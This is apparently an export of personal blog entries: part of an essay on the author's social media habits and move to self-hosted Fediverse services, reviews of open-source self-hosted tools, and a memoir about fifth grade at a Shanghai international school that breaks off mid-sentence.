regularly.\n\nThere was a WeChat Class Group and I was the only person in middle school not to join it. I got all messages proxied from my parents.\n\n## Initial Phase (2020-2021)\n\nDuring covid we need smartphones for a shitty app to upload the homework, which I hated very much. As a workaround, my parent gave me an old smartphone for me to use, and I used it very little, only for utility purposes, and abandoned it when we went back to school in March of 2020.\n\nThe day after I graduated from middle school, my parents decided I need a smartphone and WeChat. So they gave me the previous old smartphone and I finally signed up for WeChat.\n\nThen I asked to join the middle school WeChat group(like, \"hi, I know we just graduated, but can I join the class group now?\").\n\nBack then I limited my smartphone usage to a bare minimum(around 10 minutes per day). Also in my high school smartphone is strictly forbidden in school (I personally believe this is fine, but again, there is a difference between personal choices and school enforcing Nazi laws).\n\nThen like each week I would use the smartphone and social media for about 1 day like 1-2 hour, that's it. I mainly used it for utility purposes, and seeing what other classmates are doing.\n\nThen after a year I went to USTC. In the summer before I went to the library daily to pre-cram the university courses and restricted my smartphone to only 10 minutes a day in the summer(for only utility purposes, which is booking a seat in the library).\n\nThen in USTC I decided very quickly that I hate smartphone strongly, and in October I came back home and gave my smartphone to my parents and left without a smartphone to school, thus not using it for like 3 whole months.\n\nIn the winter holiday it was quite the same, I restricted smartphone usage to a bare minimum.\n\n## Exploration Phase (2022-2023)\n\nIn February of 2022, I signed up for Instagram, YouTube, Twitter. I began using this because I figured out how to use proxies in China, and I thought these social media are pretty cool. I signed up for Discord and Reddit also.\n\nIn April 2022, however, covid came again and I needed to use smartphone again(because of the signing up for testing, or else, life would become unbearable). So I called my parents and they mailed the smartphone. I was forced to use smartphone and social media, I wasn't willing. But that was another story.\n\nLater that year I began to browse things on social media more often. I browsed English social media regularly, as well as Bilibili. \n\nI watched YouTube quite frequently, mainly because I didn't learn how to bypass the GFW before, and thus I watched YouTube around 4-6 hours a day, switching very fast between videos. I primarily consumed social media and didn't upload anything there.\n\nI started to post on Instagram but found this was a bad idea, then I stopped posting on Instagram but still kept that account for a long time. I mainly used it to watch some figure skating stuff.\n\nI also browsed the social media quite often in 2023, mainly because like I got no idea what was on social media and how it worked. I browsed it for everything and nothing at all, and sometimes athletes or famous people's accounts and sometimes political and news.\n\nI also browsed a lot of Chinese social media at this time, like Weibo through its mobile app by ctrl+shift+i (which you can browse without logging in on the computer), and different forums. They kept me thinking as social media was but, quite new for me back then. I mean, I knew it for a long long time but the depth and the contents people say still wasn't familiar to me. \n\nI realize like how people behave online, and like how people spend their time ranting about something that is meaningless, sparking controversies and making others argue, just for the fun of it. People talking about trends and deliberately creating some very stupid things to get more likes and clicks.\n\nWhen I tried really hard to recall, I didn't even know what I spent my time on online in these periods, and that was quite shocking and dangerous.\n\nAfter using WeChat I feel like I can follow someone's moments, potentially for more sharing and connection. But in fact, I found out most people don't share anything meaningful in their moments at all, and most people don't understand what I am sharing anyways. So I stopped sharing. It's not like this will build any kind of intimate connections or relationships.\n\nOn the contrary, those in person relationships were the ones that I still remember over the many years that are meaningful. I don't make friends nor do I enhance any relationships on WeChat, I only lose my mind and heart over it. Connections on WeChat means literally nothing. \n\nAlso WeChat will be dictating my relationships since it is a shitty app that is proprietary and not customizable.\n\n## Losing My Mind over Social Media\n\nSo I basically got into social media the same as other people(although again, I rarely post stuff).\n\nI scrolled a lot of meaningless contents that the stupid goddamn recommendation system gave me. I began exploring both Chinese and English platforms extensively when I was bored.\n\nI left all social media in early 2024.(except school-related necessary ones)\n\n## The Social Medias that Completely Doesn't Vibe with Me\n\nSome social media, despite their popularity, never vibed with me at all, including Tiktok, Snapchat, Twitch, Likee, Instagram Stories.\n\nI just don't find them meaningful, or interesting in the least sense. I spent less than 5 hours total on Tiktok, with 2 hour I remember watching a World Cup Live(it was free, and it was like, not \"short-videos\")\n\nI don't get it why people would spend days there. It was simply very insane. \n\n## Disadvantages of Popular Social Media\n\nSocial media get you signed up for free to use their server and resources, so they bomb you with ads and track you like shit.\n\nSocial media are manipulative and gives people no autonomy. I want to store things on my own PostgreSQL instead of Twitter's, and it wouldn't let me.\n\nSocial media require captchas to sign up. While this is fine, Captchas are usually very buggy and sometimes I couldn't even solve them, or it took me 30 minutes to solve some captchas.\n\nSocial medias are known to frequently make false claims and terminate accounts. Facebook terminated my account for no reasons.(I didn't even make one post on it lmao) When you say something that social medias don't agree with, your account will be terminated. \n\nSocial medias make false claims about freedom of speech. In TwitterX, they say you can say whatever you want but many accounts are still terminated.\n\nSocial medias are known to be addictive. Many shows like \"Late Night with ...:\" or talk shows like that are completely meaningless waste of time.\n\nSocial medias are known to be manipulated by countries. Chinese social medias like Bilibili and Weibo frequently have trends demoralizing US and Japan, and YouTube frequently have videos demoralizing China and Russia.\n\nSocial medias are known for meaningless political debates that wouldn't make you a better computer science person.\n\nThere is a difference between free speech and criminal propaganda, which social media fails to make a boundary. There are widespread bitcoin scams on YouTube, and bitcoin scams in YouTube ads, which they do nothing about, with thousands of views. There are widespread gore contents on TwitterX and Telegram.\n\nYou are vulnerable on social media, they can track down the exact person easily by browser fingerprinting and mobile phones, and ips.\n\nSocial medias are proprietary.\n\nIt was like, you know you don't want to watch this, watching this clearly bothers and distracts you, and does nothing for your computer science skills, but you kept being there, mindless and for no reason at all.\n\n## Attempts to Build My Own Video Tube\n\nI attempted twice to build my own video tube for consuming contents. I used several weeks this March (just nearly all of this March) to create one with React-Bootstrap(a framework I hated ever since I finished creating the video tube). I figured that I would become more independent after creating my video tube.\n\nHowever, things didn't work the right way. Video Tubes are so so hard to create and polish.\n\nComment management, Security Vulnerabilities(someone might keep uploading to spam it), Cookies and Tokens for Authorization, Scaling, Account Deletion, Video Trans-coding and Video preview image/thumbnail, Account Blocking... \n\nAfter that I added a worker script to add subtitles and translated subtitles with Facebook NLLB and Whisper.(Yeah I like Facebook's open source stuff but hate the platform strongly)\n\nIt was just insanely complicated for a single person to do this without a significant amount of time and commitment.\n\nIt took me so long to debug and grind through these aspects, yet it was still unpolished and frequently buggy. So like I finally took it down after all, and I suffered quite a backslash from the attempt. I tried to go back to adopting social media for some time. Literally like sometimes it worked locally but failed on cloud, then sometimes I deployed it but the server hasn't got enough ram, all of these stupid small mistakes.\n\nAfter the failed attempt I did return to YouTube(FreeTube) and Instagram(through Picuki, since I deleted my account), Twitter(through the last working Nitter instance), Bilibili, Old Reddit, for some time, but it was still very distractive. It was like failure and surrendering to big-tech companies, and eventually losing my mind.\n\n## Fediverse\n\nI discovered and began joining Fediverse starting in March of 2024. I signed up for a Mastodon and Matrix account. Fediverse is the next-gen decentralized social media\n\nBut Mastodon is a very very liberal platform, and I didn't agree with many of the strongly left opinions there, which are going on every day. It is very nonsense. \n\nSince Mastodon is decentralized, there are also very right-wing nazi instances out there.\n\nAnyways, I deleted the Mastodon Account in June(I should've migrated it), and hosted my own Mastodon(along with PeerTube and Fediverse), in August.\n\nI really like Fediverse and I think it is the future of social media. For one, every use have autonomy over their own instance, and it is open source. Also, each instance can communicate. It is sort of like the server is doing the heavy-loading, like setting up Linux package mirrors.\n\nMany new social media are adopting Fediverse(like Threads dot net)\n\n## Potential Negative Aspects of Not Using Social Media\n\nSome people are suggesting you will miss out information. But it's not like the earth will crumble tomorrow, why should I freaking care? Using social media doesn't make me smarter in computer science.\n\nI get all the latest software and updates in RSS feeds and browse Github and Huggingface regularly, though.\n\n## What I did create\n\nI basically set up my cloud infrastructure. \n\nI did create a task manager backed with MongoDB, an LLM api frontend, a deprecated S3 frontend(because I found an awesome open source project), a markdown note taker backed with MongoDB. I am using these things daily and they are seeing wider adoption in my ecosystem than the unsuccessful video tube. \n\nThe frontends are all NextJS. By the way vercel is an excellent platform and company, and NextJS with Tailwind CSS is so smooth and easy and beautiful and clean. Bootstrap can be quite ugly in my opinion.\n\nSo basically like first two years I avoided it, then two years later I ditched it for complete alternatives.\n\n## The Future of My Social Media Use\n\nAmidst all of these, I haven't changed.\n\nI have just restrict social media use to once a month, and hoard the videos and datas to my own Cloud Storage on that day. \n\nI will primarily dwell on my own platforms, and I hate social media strongly throughout the years.\n\nMy stance isn't strict enough, and I am still leaving an open door. It's not like I am extremist in this matter. Some people who are extremist refuse to run proprietary Javascript code and uses only LibreJS and GNU Icecat(or hardened Firefox).\n\nI am anti-social. But I am not opted out completely. I use WeChat now and then for utility and I am on Fediverse so you can reach my own one-person instance from literally any instance in the world.\n\n## Conclusion\n\nThe main apps I use daily on my phone are the Miniflux and other Alist(S3 frontends) with PWA support in Firefox Nightly.\n\nIn something called \"social media\", I lose.", "date": {"$date": "2024-08-23T18:43:28.664Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dee1"}, "title": "Some Opinions on Popular Open Source Platforms", "type": "web-dev", "access": 1, "body": "I really think these open source projects are amazing, these are just personal opinions that doesn't mean anything.\n\nI prefer PWA to a local Android app because like you can easily sync and use your own Postgres database for that, instead of having it only run locally on Android.\n\n## Some Problems (opinionated) \n\n### Joplin\n\nJoplin doesn't have a web interface, and its syncing options is kind of buggy and not responsive in certain AppImages on Archlinux. I really want a web interface.\n\nAlso Joplin uses SQL in local storage, which confines you in Joplin to edit things, or you can implement another frontend to the underlying SQLite to edit it in another editor, but what's the point of using Joplin in that case anyways? \n\nI now use a Markdown Editor with PWA, which I built with NextJS for blog editing.\n\n### NextCloud\n\nNextCloud is build on PHP, and it is too slow and laggy on a server, it ships with large chunks of useless stuff and functionality(trying to be an alternative of Google Drive but actually not), and is too complicated and unpolished for daily uses.\n\nNextCloud does too many things, like mail, editor, calendar, and lots of things I don't know about, which is largely unnecessary. It's not doing anything good, like, literally nothing I can rely on. It's sort of like Google Drive+Google Calendar+Google Photos+Google Tasks and amillion other things in one.\n\nYou can connect Nextcloud to an external S3, but it was so slow and not usable at all. People say Nextcloud is alternative to Dropbox, which is totally wrong. Nextcloud isn't a storage solution itself, or else you must rely on SSD(which is expensive and hard to move around), it's just a bloated frontend.\n\n### Actual Budget\n\nA personal finance management tool. I would say it's not bad, but the primary problem is one user only. So I cannot easily share my finance with, say, parents or other people without revealing the root password.\n\n### JellyFin\n\nJellyFin doesn't have build in S3 support, so hoarding large amounts of media becomes not practical. Even for small amounts like 100 GiB of videos it's better and much cheaper to store on S3.\n\nSpeaking of DIY solutions, of course I know \n\n1. You can use `s3fs-fuse` to simulate S3 in disk, but this is buggy and very bad and slow in performance, and very unnecessary. This is a clever hack instead of a true solution. \n\n2. S3 have huge egress fees. Sure, but AWS Cloudfront have 1TB/month free, and not every S3-compatible provider have a huge outbound egress like AWS. For example, Cloudflare R2 and Wasabi charges no egress at all.\n\n### Immich/PhotoPrism\n\nPhotoPrism doesn't support multi user. Photoprism and Immich are bad at syncing since they don't support S3 Storage well, so you have to rely on disk. There are apps on android to automatically sync, but it still causes problems, as photos come not only from Android and comes from everywhere.\n\nUsing Google Photo is better because it is better in syncing and controlling the data (Google Takeout), and you have to spend a huge chunk of time syncing the data if you don't install the Immich(or a sync app) on Android(which I don't want to install).\n\nBut I don't use Google Photos, I just use FolderSync to sync my photos to S3. Scripting Google Photos or performing basic API tasks require a lot of time to learn, since it's tied to Google's ecosystem.\n\n### Stash\n\nStash is a personal media organizer.\n\nStash uses React Bootstrap, and the project shows some reasonable effort, but the image generating and video previewing (it's machine learning part) is largely not mature, it frequently runs into errors and isn't the best solution. \n\nThe interface, since it's designed with React Bootstrap, looks quite ugly and unpolished.\n\n### Rclone Web\n\nRclone web is an react frontend build on top of rclone, however, the frontend is quite unpolished and buggy, leading to errors when uploading large files. Anyways, it's not actively developed and not popular.\n\n### LibreTranslate\n\nIt uses Argon2, which is inferior than the latest ML translation models, like Helsinki NLP or Facebook NLLB. \n\n### Invidious/Piped\n\nGenerally great project but frequently runs into bugs in the web interface. This isn't related to Invidious, but rather YouTube's desire for monopoly and ad-bombing people, as well as controlling the media and filling people's heads with clickbait.\n\nUsing a local client like FreeTube or Newpipe, which scraps the YouTube api like `yt-dlp`, is generally less error-prone.\n\n### Filestash\n\nGood on the demo but runs into bugs.(cannot connect to remote)\n\n### LobeChat\n\nA comprehensive LLM wrapper frontend with PWA support, proxying to almost every LLM api endpoint, with plugins like Dalle and 30k+ stars on Github, with Whisper calling for input voice recognition, sounds good, right? \n\nHowever, the web page takes around 5 seconds to load, and when you give a long prompt, the webpage would react very slowly, almost freezing. Also, the settings take a really long time to open, and the frontend streaming Javascript behaves strangely, namely when you navigate away from the webpage it would stop generating(returning the response). The streaming API endpoints in LobeChat returns with additional unnecessary latency, like 2 more seconds. \n\nThere are all those LLM wrappers out there anyways like LangChain, Vercel AI Sdk, that support all LLM provider and models and huggingface. I built a LLM wrapper with NextJS and vercel ai sdk really quickly that performs really good(just like how it should be), but with lacked functionalities like image or plugins, which is fine for me, as I can also use other platforms a few times a month.\n\n### ChatGPT Next Web\n\nAnother LLM wrapper, with 70K+ stars on Github, and I would say it's decent. However, as an API wrapper it doesn't support the main platforms like AWS Bedrock and Azure endpoints (which is quite literally insane), only the official Openai, Anthropic, and Gemini Endpoints.\n\n### Gitlab\n\nGitlab is huge and overkill for a simple git server. Installing Gitlab is quite some work and you need a server with like 4GB ram for it to run smoothly alone. Also Gitlab has a lot of configuration to do and the docker image not as easy as installing it directly.\n\nI set up Gitlab primarily to use as a mirror for my Github, but the mirroring instance is locked behind a paywall for \"enterprise version\", which makes me really annoyed. Literally it's my own server and they are charging me for some fundamental things, it's not like I need such a comprehensive tool set anyways.\n\n## Platforms I really like\n\nNow, Some Platforms I like, thank you so much for making my life so happy, I love you!\n\n### Peertube\n\nPeertube is a decentralized video tube that allows you to host your own and federate with other instances(so you can watch your video on other instances and others can search for your account on their instance, and you can comment too). Of course it doesn't federate the videos themselves, only metadatas.\n\nPeertube has an embedded whisper into it for transcribing(although it doesn't have dual subtitles, which language learners might find useful). It also have tools for importing torrents, going live, `yt-dlp` for importing creative commons videos(don't try to import copyright videos), S3 backend support, like, literally all the functionality for a video tube and more(although with the lack of a ML-based recommendation system)\n\nBut dual subtitle is easy to implement and I used a script to run whisper and encode the subtitles right into the video easily with ffmpeg.\n\nAs someone who had tried to implement and built a custom video platform(and it worked really bad, I quitted miserably, not able to fix many bugs), I can say Peertube is really good and polished and shows significant work and efforts.\n\n### Mastodon\n\nMastodon is a decentralized Twitter, much like other Fediverse tools. \n\nMastodon's main instances are quite liberal and progressive, showing strong political opinions frequently. So it's best to host my own instance.\n\nAlso many recent social media, including Threads and Truth Social, are closely related to Mastodon. Truth social is built on Mastodon as backend (one of its primary engineers is very controversial, who also contributed a lot to the other Fediverse app Pleroma). Threads is compatible with Activity Pub Protocol.\n\n\n### Matrix\n\nMatrix is decentralized chat app, also part of fediverse. When joining another server, the server will work for a long time(depending on the group size). I can clearly see the CPU and RAM go way up for a long time, as it tried to communicate and get the data. \n\nWhat is really exciting is that the server side got multiple variants implemented in Golang, Rust, Python. I hosted Dendrite.  \n\n### Alist\n\nThis is an S3 frontend tool, quite with same functionality like filestash but it doesn't error and looks really nice. It can play videos automatically in the same folder.\n\nOf course, Alist have a lot of things I don't need, like opening videos in VLC or MPlayer(which I don't need), connecting to sources other than S3 like Google Drive or Dropbox, creating `.alist` files sometimes, and a lot of other functionalities.\n\nI previously tried to implement an S3 frontend, and it was quite easy but unpolished.\n\n### FreshRSS\n\nIt's a web based RSS tool with PWA. It has everything I need, and it's very easy to setup and manage with no bloats to read RSS feeds. But the button on top is quite ugly(personal opinion).\n\n### Stirling PDF\n\nStirling PDF is a comprehensive PDF toolset. These days I primarily use Markdown, so I don't use PDF much. I can also use pandoc locally, but it needs a latex engine compatible with unique characters.\n\n### Gitea\n\nGitea is very easy to spun up and manage, having all the necessary functionalities. Easily working out the box, providing mirror for any git repos.\n\n### Grafana\n\nIt is a visualization for monitoring servers and cloud. It can even monitor the weather. Grafana integrates well with AWS and Azure services, though it's a bit overkill in my opinion.\n\nI can build really beautiful dashboards with queries(or pull from an S3 bucket, or any csv urls, as well as Postgres as backend).\n\n### Metabase\n\nMetabase is literally very heavy on RAM, but it's a great visualization tool for database. It needs some more config to run on Arm devices, but it's not that hard. Metabase supports a lot of database drivers like MongoDB and Postgres. It uses a Postgres itself(or an embedded H2 by default or MariaDB or others), and you can connect Metabase to its own database.\n\n\n", "date": {"$date": "2024-08-28T10:13:48.468Z"}, "__v": 0}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dee2"}, "title": "Smic School, the School in My Dream", "type": "journal", "access": 1, "body": "## My Memory Before\n\nMy first memory in my whole life is when I was only three. That birthday my grandma said I was one hundred centimeters tall. I was excited.\n\nThen I remembered more and more things. I was in kindergarten. I could still picture the classroom and the games we played there. I performed somewhere and graduated. I had many memories in elementary school. I couldn't even write them all down on a single page of paper. I started first-grade and got homework; the bad final exam; the fast second term of first-grade; the summer I started learning extra math; the math competitions, when I drank a cup of hot soybean milk and got a prize; always finishing homework in school and practicing English at home(my mom made me do that); bad fourth-grade Cinese teachers; the change of schools; the boarding summer camp. All kinds of little memories led me to fifth-grade, a more successive part of memory in my life, and unforgettable.\n\n## Foreword\n\nThe book is for my fifth-grade classmates and teachers, with sweet memories about my previous year.\n\n## Prologue\n\nMy name is Jim Chen. I live in Shanghai. \n\nI was in fifth-grade. I changed to a new school.\n\nThis meant there were different students and teachers. I changed my school because my English was bad, and my previous school is bad at English teaching. \n\nMy new school is an International school. It is very good at English teaching.\n\nA year full of suprise and happiness was about to began.\n\n## Smic School\n\nThe story started in the end of August, 2015. Many parts of it is nonfiction. It started when I was sitting in my mother's smelly car, which was driving steadily on LongDong Avenue. It always smelled bad. I opened the windows to let fresh air come in.\n\nI was on my way to visit my new school teachers. I was in a public school but was about to change to a private school. I was a new student there. The school held a test for new students. I passed it and the principle said I can be here for fifth-grade.\n\nTeachers in public schools are always grouchy with no clear reasons. They are always in a bad mood. I thought it is because their salaries are low.\n\nThen the car stopped and I got out. There principle was going to give a lecture to us. I knew I was in Mr. Zhang's class in Chinese Track 5A. There were also two other new students in our class.\n\nLater, I found out Mr.Zhang is a good teachers. I was very lucky to go to his class to have a magnificent year.\n\nThe first day to school was a good start. I took the school bus to school. The teacher who was in charge of it was so nice that she couldn't keep the noisy students quiet.\n\nAfter we arrived in school, Mr. Zhang asked us for introductions. I hadn't prepared for it much, so I just said my name is Jim Chen and will be here for fifth-grade. That's all.\n\nI found out the school is divided into Chinese track and English track. Chinese track is where Chinese student who passed the admission test go to. English Track is where foreigners go to.\n\nAfter I know other student's name, I was very surprised to know there are six students with last name Chen, including me.\n\nSmic School is very big. It included kindergarten, elementary school, middle school, and high school. My favorite place is the cafeteria, where it serves delicious food, cause food is not good in public school, so I enjoyed them very much.\n\nBecause Smic School is a private school, which parents pay a lot of money every year, teachers are all very kind. They are patient and knowledgeable, especially music, art, and PE teachers.\n\nI used to have very bad music teachers. They didn't care about how we learned. Some of them couldn't even sing themselves. They sometimes even made us sit still all class. How could teachers like that help me learn music well? \n\nMusic teachers are better here. They taught us flute. They didn't yell at students. Art and PE teachers are better too. Art teachers could drew almost everything, where in public school they used to only make us walk many times from our classroom to the school art lab and never teaches anything. That was horrible.\n\n## Activities\n\nThe second week was pretty interesting. We started the reading week.\n\nThat's when I started my reading career. I didn't lke reading at all. I could only read books with only four lines on a page. My parents made me do it, and I thought it was boring.\n\nWe borrowed books from the school library. The student who borrowed the largest number of books won.\n\nMr. Weng, our English teacher, led us to the library. We walked around the library. I practically wandered around, seeing so many books made me kind of scared. I was hoping to find a good book when I spotted Junie B. Jones Aloha-ha-ha on a shelf. I got interested by the title of this book, so I borrowed it and started to read.\n\nWhen I started reading, I found out that this book is so funny. There were almost twenty lines on a page. I was so surprised and proud that I could read forty-five pages in one day, five times than before.\n\nI learned that foreigners usually read this kind of books in first-grade. I read it in fifth-grade, but I still thought it was a little bit hard.\n\nI also borrowed A to Z mysteries, Magic Tree House, and Ready Freddy. I finished one book from each series. I was so proud of myself.\n\nI haven't won the reading prize, which were the top ten readers of our school. They are always reading too many books, and I thought they are better at English, at least better than me. But I was still very happy that I read so much and fell in love with reading immediately.\n\nOn the last day of the third week, the school held the Soccer Day. We were going to Shanghai America school. It was my first full day with soccer. I was excited.\n\nWe got inside a school bus. I waited for a long time and the bus finally arrived at the school. I ran onto the field happily.\n\nMy mom came with me. We were going to compete six times with six different classes in different schools.\n\nI liked soccer very much. I went to many football camps almost every summer, but I was still not the best football player in our class. \n\nI joined four matches. i was too tired to play the other two. I couldn't walk after participating in so many matches!\n\nWe won five times and only lost once. It was the last one and also because other players were all so tired. We were also a little arrogant and thought we were invincible.\n\nI must admit I was not a football expert. I never kicked the ball into the net.\n\nHowever, even if I haven't scored a goal, I still enjoyed the day very much. I have never had a whole day with soccer.\n\n## My Study Here\n\nI was very good at math. I got a high score in the first math test.\n\nThe teacher seemed to be amazed, too.\n\nThere was only one other student in the class who is also as good as me in math, and we were the best two in our grade.\n\nI wasn't good at English.\n\nMr. Weng taught us English. He is a nice guy.\n\nActually he teaches ELA (short for English Language Art). He teachres with a textbook titled \"Reach\".\n\nI used to learn the textbook \"Oxford English\", which was so awful. Once I even read a story that was about the name of a week. It said that one day seven people named Monday, Tuesday, Wednesday, Thursday,  Friday,  Saturday, and Sunday had a meeting. So people used their name to name after the days of a week. That just didn't make any sense. I found out things like Monday is named after the moon and Tuesday is named after Tiu in a dictionary.\n\nMr. Weng gave us worksheets. I was not good at it first. But later, I adjusted to it.\n\nI was an average student in Chinese.\n\nTeachers were less strict. They graded our tests leniently.\n\nI got eighty on the first test; I used to get only seventy or less. So I was really surprised and felt great.\n\nAfter the mid-term exam, the math teacher changed, since our average math score is only about 70.\n\nOther parents said this math teacher is really bad. So they changed the math teacher into a stern one.\n\nThe new math teacher was good at teaching, at least better than the first one.\n\nShe mostly talked about the handwriting, which I was bad at that time. She criticized me. \n\nOur school had a big lunch one day. Every parent brought something to eat to school and we had a buffet. \n\nThe food was so delicious that my saliva was about to fell out. \n\nThe lunch in fourth-grade was so bad. They are disgusting. There was only rice every day, cause lunches in public schools are bad.\n\nWe can select food in Smic School. There were spaghetti every day, which was my favorite kind of food, sometimes even pizzas, french fries, and hamburgers.\n\nMy dream was to just eat these foods every day. My dream came true.\n\nI ate so much chickes that my tummy was about to burst.\n\nMy mom brought dumplings. It was not as good as chickens, almost nobody liked it.\n\nMy mom had a talk with my new math teacher after lunch. They talked about math competitions and how I would not write my homework messy again.\n\nMy math practice book was so messy. Papers were about to fall off. I glued them up after I came home and wrote very slowly to make sure I did all the problems right. I made sure my practice book was neat.\n\nThe new math teacher's manner to me had changed since then.\n\nThe nest day in class I raised my hands very often. The math teacher asked my to explain the solution in front of the class.\n\nI was very careful at math tests. Carelessness is a serious problem for me. I  got ninety-eight on the first test. I was the first one to finish the test and also the highest score in my class.\n\nThe math teacher started to be nicer to me.\n\n## Final Exam\n\nTime went by like a flash. October and November were gone like one hour or even less. Shanghai became colder, we started wearing coats. December came.\n\nIt was an important month because lots of things happened this month.\n\nI started to like English books more and more. Nobody made me do it. I read by myself.\n\nI skipeed the words I didn't know, which become less and less\n\nBy the end of November, I had only read less than twenty English books. In December, I read more than fifteen.\n\nIn December, I was the top ten readers in our school. I actually read two and a half Junie B. Jones books in one day. i couldn't believe it. I started reading a lot.\n\nChristmas was also coming. In my previous school there was usually a Christmas party to celebrate Christmas. Many studnets performed, I played accordion every year.\n\nIn my new school, it became a party. We performed Jingle Bell Rock. We play flute in front of all the audience, which included principle, teachers, and students.\n\nMy. Weng gave us some Christmas Carols. I liked Angles We Have Heard on High, Twelve Days of Christmas, and Rudolph the Red-Nosed Reindeer best. They were lovely songs.\n\nWe watched a movie about the Nativity story.\n\nI also went to visit my previous school students, when our International school had one more day off. They were surprised to see me again.\n\nThen Christmas ended and a new year started.\n\nI made myself a reading sheet. I would write all the books I read on it. I was hoping I could read over fifty-two books this year, which is the same number as the weeks in a year.\n\nThe final exam started. I prepared very well. I did all the tests carefully, espeically math. I didn't have any problems in math. I studied math on extra classes on weekends. I finished math tests within thirty minutes. I didn't look around or do other things, I looked at my math test again and again. \n\nI concentrated hard on the math test. I was almost sure I got a good score.\n\nI got a good grade in English Language Arts.\n\nI got eighty-eight in Chinese.\n\nThat's not all, most of all, I got 100 in math!\n\nTeachers were proud of me.\n\nThe math teacher previously mad at me became very good to me. She sent me snacks. Mom and I also sent here a gift. She said I am a good student.\n\nI had been here for only one term and started doing things well. \n\nI smiled at myself.\n\n## My Math Competitions\n\nMy winter vacation was busy. I studied math very hard. I was preparing for some math competitions.\n\nThere were four math competitions. I can still remember two of them clearly.\n\nIn January 24th, I went to the first competition. It was a cold day in Shanghai, the coldest day in a year. Water pipes broke down, everyone wore coats when they come out and never forget opening the hot air conditioner at home.\n\nI haven't finished the test when the time was almost up. But luckily, he teacher first got out testing papers. I still had my answer sheet. I used my memory to remember a problem and actually figured it out before the teacher got my answer sheets. I got the third prize. I realized I was only two points higher than the third prize score, that problem really helped me a lot.\n\nBefore I knew it, the winter vacation had ended. School started and everything went back to normal. \n\nI went to the Olympic Math Competition. If someone passed the preliminary one, the second one, and the third one, the person will go to Singapore. I thought I couldn't go to Singapore even if i study an extra year.\n\nI was in a good class in Xueersi, the extracurricular math training camp every weekend. I went to the second one directly.\n\nIn the second test, I got a second prize and was seventy-six in the rank of Shanghai! I used to get three hundred or even more. I passed the second test easily.\n\nIn the third test, I finished the problems pretty fast. I remembered to check whether I had written the answers on my answer sheet or not. I remembered last year when I was in fourth-grade and also participated in the same test when I forgot to write my answers on the answer sheet and the teacher started collecting our answer sheets so suddenly, and I hadn't written three of them, but they were all wrong answers.\n\nThen time was up. I gave my answer sheet to the teacher confidently. I was sure I got a good score.\n\nI waited for my score anxiously and curiously for a long time. I couldn't even sleep on the day the score was announced. \n\nIf I was the first twenty in Shanghai, I would go to Singapore, but that was a dream.\n\nHowever, I was fourth-forth in the rank in Shanghai in the third test. Though I didn't get the opportunity to go to Singapore, I was joyful by getting such a good score!\n\n## Spelling Bee\n\nI had read a lot of books this year. \n\nAfter I finished Junie B. Jones series, I started reading Ready Freddy. It was not as good as Junie B. Jones. All the books were the same kind about how someone is first sad, persisted, and was then happy, or even just someone thought of a good idea or whatever. I felt tired reading almost the same books forever.\n\nMagic Tree House is what I read this March. It is good because it was more realistic for people to believe. It was better than Magic School Bus, which I just finished a couple days ago. Magic School Bus was disorganized and looked like fantasy so much. In Magic Tree House, there might be only one or two magic tricks while in Magic School Bus there were many and people turn into germs or whatever. There were also things like doing a project being nearly dead.\n\nAnyway, I felt spelling a lot easier than before.\n\nOne of my most important events this year was the spelling bee. Mr. Weng gave us a whole list of words. When I came home, I read all the words and recorded them all on my iPad. I then listened to it and wrote the words on a paper.\n\nThe first time I got three of them wrong, which was \"obstacle\", \"perform\", and \"precipitation\". I made a mistake on perform because I was not sure if e or r is first, I spelt it \"preform\". I circled the words and prepared for them.\n\nOn the day of our class spelling bee, Mr. Weng let us play a spelling game.\n\n\"Everyone stand up and I will call each of you to spell a word. If you spell it wrong then sit down, whoever is the last one standing wins.\"\n\nEveryone stood up and Mr. Weng called each of us to spell the words he said. Many students sat down.\n\nI spelled communication right on the last turn. I was the last one standing there.\n\nReading English books really helped on spelling. I could feel my English skills improve so fast.\n\nMr. Weng gave us a paper and we recited the words down, whoever recited the most correct can go to the school Spelling Bee.\n\nMr. Weng gave us fifty words. They were harder, but just a little bit. I used the previous way to recite them. I got a little bit wrong. I still remembered the list began with \"education\" and \"immigration\". It still sounded familiar to me.\n\nMr. Weng let us watch a video of American state spelling match. There were words so long that I could not remember. They were so difficult.\n\nHe then told us that they don't spell a letter wrong. There was a judge. If you spell some letters in a word wrong, then the whle word was wrong.\n\nHe told us about another thing, think before you spell. You couldn't cancel some letters in a word, so don't spell too fast and immediately realize that it was wrong, but also spell the word within fifteen seconds.\n\nThere were three students in each class to compete with other students. Our class competes with Chinese track fifth-grade and English track fourth-grade.\n\nThe day finally arrived. I expected it to arrive faster since the day I was announced to enter the school spelling bee. I was number fifty-four, the judge was the teacher that taught the class next to ours, I think he is stern because he ripped four students' testing papers when they talked in a test. He even said they cheated.\n\nThe spelling bee started in a very official way. Every member wore a card that has their numbers on it. We went to the auditorium and sat on the front rows. There were eight competitors, including me, from six different classes.\n\nWe went on the stage. We sat on eighty chairs. The judge started calling each of our numbers.\n\nThe student whose number is being called goes over to the microphone and spell aloud the words they were supposed to spell.\n\nThe audiences were all the Chinese track fifth-grade and English track fourth-grade students and teachers. I never did something in front of so many people. I was nearly scared to death.\n\nWhen the judge calls fifty-four, I went over to the place scaredly. I almost fainted.\n\nI was afraid that I might spell the word wrong, failing to live up to the expectation of my teachers and classmates.\n\nLuckily, I spelled it right.\n\nAfter many rounds there were still six of us, including me. Then the judge started to give us another list of words to make it harder.\n\nThen my number was called and I walked up with a panic expression on my face. I could even feel my heart beat as fast as a speeding rocket.\n\nThe judge asked me to spell the word \"especially\", which is simple because I kind of have seen this word before. I remembered it. \n\nSo I spelled it right.\n\nWell, the new list isn't as hard as I thought, you know, just spell it according to the judge's pronunciation.\n\nThree students failed in the first round of the new list of words.\n\nBut wait.\n\nThen my number was called again.\n\n\"Fifty-four.\"\n\nI walked up again, this time more relaxed.\n\n\"Specialization.\"\n\nWhat the heck is that? I haven't seen this word before, not in the books I read, not anywhere.\n\nI saw the face of Mr. Weng, which was kind of hard to describe. \n\nThink more, I thought to myself, maybe you can do it.\n\nI could divide the word into two parts, one is special, the other part is \"lization\". I had seen \"globalization\" or \"desertification\". I said them one time in Mr. Weng's class when he asked us to say words ending with \"tion\", and Mr. Weng was impressed.\n\nSo, back to the spelling competition. We were at the significant round to find out who is the champion. The first part of the word is \"special\", the second part \"lizaion\", I put the two parts together and formed \"speciallization\". I kind of spit the word out, but then paused.\n\nWait, is there anything wrong with \"speciallization\"?\n\nI realized maybe it will be better with \"specialization\".\n\nThen I spelled 